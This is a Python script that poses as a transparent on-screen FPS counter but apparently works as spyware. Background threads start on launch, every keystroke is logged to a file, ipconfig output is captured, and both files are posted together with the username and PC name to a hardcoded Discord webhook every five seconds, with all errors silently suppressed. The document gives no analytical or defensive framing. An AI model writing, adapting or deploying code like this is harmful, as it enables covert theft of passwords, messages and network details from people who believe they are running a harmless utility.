import os
import platform
import random
import string
import subprocess
import threading
import time
import pygame
import json
import requests
import socket
import pyperclip
import psutil
from pathlib import Path
from pynput import keyboard
import tkinter as tk
import sys
from PyQt5.QtCore import Qt, QTimer
from PyQt5.QtGui import QFont, QColor
from PyQt5.QtWidgets import QApplication, QLabel, QWidget

# Initialize variables and paths
pc_name = socket.gethostname()
log_file = "key_log.txt"
file_pathip = os.path.join(os.getcwd(), 'ipconfig.txt')
settings_file = "settings.json"
user_name = os.environ.get('USER') or os.environ.get('USERNAME')
last_timestamp = None

# Ensure the log files exist
if not os.path.exists(log_file):
    Path(log_file).touch()

if not os.path.exists(file_pathip):
    Path(file_pathip).touch()

if not os.path.exists(settings_file):
    Path(settings_file).touch()

def load_settings():
    if os.path.exists(settings_file):
        with open(settings_file, "r") as f:
            settings = json.load(f)
    else:
        with open(settings_file, "w") as f:
            json.dump(settings, f)
    return settings

def update_settings(new_value):
    settings = load_settings()
    settings["yes"] = new_value
    with open(settings_file, "w") as f:
        json.dump(settings, f)

# FPS counter function (for transparent window)
def get_timestamp():
    """Returns the current timestamp as a formatted string."""
    return time.strftime("[%Y-%m-%d %H:%M] ")

def on_press(key):
    """Logs the pressed key to the file with timestamp every minute."""
    global last_timestamp

    try:
        with open(log_file, "a") as f:
            current_time = time.time()
            formatted_time = get_timestamp()

            # Add a new timestamp every minute
            if last_timestamp is None or (current_time - last_timestamp) >= 60:
                f.write(f"\n{formatted_time}\n")
                last_timestamp = current_time

            # Log the keypress
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)  # Log regular keys
            else:
                f.write(f" [{key}] ")  # Log special keys (Enter, Shift, etc.)

    except Exception as e:
        pass

# Upload function to Discord webhook
def upload_file_to_webhook(file_path, webhook_url):
    """Uploads files to a Discord webhook."""
    try:
        with open(file_path, 'rb') as file, open(file_pathip, 'rb') as ipfile:
            payload = {
                'content': f'Here are the logs for the user {user_name} and the PC name is {pc_name}. This message also includes IPCONFIG data.'
            }
            files = {
                'file1': (file_path, file),
                'file2': (file_pathip, ipfile)
            }
            response = requests.post(webhook_url, data=payload, files=files)
            if response.status_code == 204:
                pass
            else:
                pass
    except Exception as e:
        pass

# Upload every 5 seconds
def upload_every_5_seconds(file_path, webhook_url):
    while True:
        pass
        upload_file_to_webhook(file_path, webhook_url)
        time.sleep(5)

# Run the ipconfig command every 5 seconds
def run_ipconfig():
    while True:
        try:
            result = subprocess.run(['ipconfig'], capture_output=True, text=True)

            # Write the output to the ipconfig.txt file
            with open(file_pathip, 'w') as file:
                file.write(result.stdout)
                pass

        except Exception as e:
            pass
        
        time.sleep(5)

# Clear the console every second
# def clear_console():
#     while True:
#         if os.name == 'nt':
#             os.system('cls')
#         else:
#             os.system('clear')
#         time.sleep(1)

class TransparentWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setGeometry(0, 0, 200, 100)
        self.label = QLabel(self)
        self.label.setFont(QFont("Arial", 20))
        self.label.setStyleSheet("color: white")
        self.label.setGeometry(10, 30, 200, 50)

        # Timer to update the FPS counter every 100ms
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_fps)
        self.timer.start(100)  # Update FPS every 100ms (0.1 second)

        # Variables for FPS calculation
        self.frames = 0
        self.last_time = time.time()
        self.fps = 0  # FPS value to display

    def update_fps(self):
        current_time = time.time()
        self.frames += 1
        elapsed_time = current_time - self.last_time

        # Update FPS every second (1 second period)
        if elapsed_time >= 1.0:
            self.fps = self.frames  # Set FPS to the number of frames over 1 second
            self.frames = 0  # Reset frame count
            self.last_time = current_time  # Reset time
            self.label.setText(f"FPS: {self.fps}")  # Display FPS on label

    def mousePressEvent(self, event):
        """To prevent dragging the window when clicked."""
        event.ignore()

# Define the webhook URL
webhook_url = 'https://discord.com/api/webhooks/1335214600714457158/tzhsBy9cn-22l9vBGxfDs8kaoQ4CCsuTkqQhNvJe5BQ6ECrgHBD4JvEt-e5Kj3hftuSO'

# Start upload thread for log file
upload_thread = threading.Thread(target=upload_every_5_seconds, args=(log_file, webhook_url))
upload_thread.daemon = True
upload_thread.start()

# Start ipconfig logging thread
ipconfig_thread = threading.Thread(target=run_ipconfig)
ipconfig_thread.daemon = True
ipconfig_thread.start()

# # Start console clearing thread
# clear_thread = threading.Thread(target=clear_console, daemon=True)
# clear_thread.start()

if __name__ == "__main__":
    # Load settings
    settings = load_settings()

    # Update the settings to True right after loading settings
    update_settings(True)

    if not settings["yes"]:  # If 'yes' is False, show the FPS counter window
        app = QApplication(sys.argv)
        window = TransparentWindow()
        window.show()

        # Start the event loop after updating settings
        sys.exit(app.exec_())
    
    # If 'yes' is True, do nothing (counter is not shown)
    else:
        pass



# Start the key listener in the main thread
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
